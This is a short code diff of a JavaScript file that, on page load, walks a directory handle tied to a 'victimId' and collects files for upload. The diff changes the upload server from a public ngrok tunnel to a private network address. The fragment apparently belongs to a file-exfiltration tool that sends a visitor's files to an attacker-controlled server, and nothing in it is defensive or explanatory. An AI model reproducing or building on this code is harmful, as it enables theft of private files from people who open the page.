@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', function () {
-  const serverUrl = 'https://defc-113-40-207-10.ngrok-free.app/upload';
+  const serverUrl = 'http://192.168.62.5:8080/upload';
 
   async function processDirectory(directoryHandle, victimId, currentPath = '') {
     const files = []; // Store all files
